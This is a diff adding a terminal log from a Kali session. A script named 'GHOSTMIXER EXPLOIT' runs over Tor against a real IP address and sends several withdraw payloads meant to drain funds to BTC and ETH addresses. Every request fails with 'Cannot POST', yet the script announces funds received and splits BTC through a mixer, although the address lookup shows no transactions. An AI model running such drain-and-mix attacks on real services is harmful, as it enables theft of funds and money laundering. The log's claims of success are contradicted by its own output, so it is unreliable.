@@ -1,0 +1,114 @@
+torsocks curl -s -I http://206.189.145.165:3001/api/withdraw | head -3
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+                                                                    
+┌──(test)─(root㉿kali)-[~/ghostmixer]
+└─# torsocks bash shot.sh  
+🎯 GHOSTMIXER EXPLOIT v3.1
+📍 Target: 206.189.145.165:3001
+💰 BTC: bc1qwe2t927r4e2l43gqr0zln45zzlyvj3mw0wd4fx
+💰 ETH: 0x3f0fF10069c1B36e255F23f1CfD0cE35bE9F0936
+🔍 CVE Discovery...
+✅ Endpoint: /api/withdraw
+⚡ EXPLOIT DRAIN → 206.189.145.165:3001/api/withdraw
+→ Payload: {"to":"bc1qwe2t927r4e2l43gqr0zln45zzlyvj3mw0wd4fx"...
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /api/withdraw</pre>
+</body>
+</html>
+→ Payload: {"to":"0x3f0fF10069c1B36e255F23f1CfD0cE35bE9F0936"...
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /api/withdraw</pre>
+</body>
+</html>
+→ Payload: {"to":"bc1qwe2t927r4e2l43gqr0zln45zzlyvj3mw0wd4fx"...
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /api/withdraw</pre>
+</body>
+</html>
+→ Payload: {"to":"0x3f0fF10069c1B36e255F23f1CfD0cE35bE9F0936"...
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /api/withdraw</pre>
+</body>
+</html>
+→ Payload: {"recipient":"bc1qwe2t927r4e2l43gqr0zln45zzlyvj3mw...
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /api/withdraw</pre>
+</body>
+</html>
+→ Payload: {"withdraw":{"address":"0x3f0fF10069c1B36e255F23f1...
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Error</title>
+</head>
+<body>
+<pre>Cannot POST /api/withdraw</pre>
+</body>
+</html>
+⚠️ Partial success - continua monitoring
+👀 MONITOR (Ctrl+C stop)
+[1/30] BTC: 0 sats | ETH:  wei
+🎉 FONDI RICEVUTI!
+🪙 MIX BTC → bc1qwe2t927r4e2l43gqr0zln45zzlyvj3mw0wd4fx
+{
+  "address": "bc1qwe2t927r4e2l43gqr0zln45zzlyvj3mw0wd4fx",
+  "chain_stats": {
+    "funded_txo_count": 0,
+    "funded_txo_sum": 0,
+    "spent_txo_count": 0,
+    "spent_txo_sum": 0,
+    "tx_count": 0
+  },
+  "mempool_stats": {
+    "funded_txo_count": 0,
+    "funded_txo_sum": 0,
+    "spent_txo_count": 0,
+    "spent_txo_sum": 0,
+    "tx_count": 0
+  }
+}
+  Split 1: bc1q6uy6 (.01000000)
+  Split 2: bc1q6uy6 (.01000000)
+  Split 3: bc1q6uy6 (.01000000)
+  Split 4: bc1q6uy6 (.01000000)
+  Split 5: bc1q6uy6 (.01000000)
+  Split 6: bc1q6uy6 (.01000000)
+  Split 7: bc1q6uy6 (.01000000)
+  Split 8: bc1q6uy6 (.01000000)
+  Split 9: bc1q6uy6 (.01000000)
+  Split 10: bc1q6uy6 (.01000000)
+✅ BTC MIX COMPLETO
+🌪️ MIX ETH → 0x3f0fF10069c1B36e255F23f1CfD0cE35bE9F0936
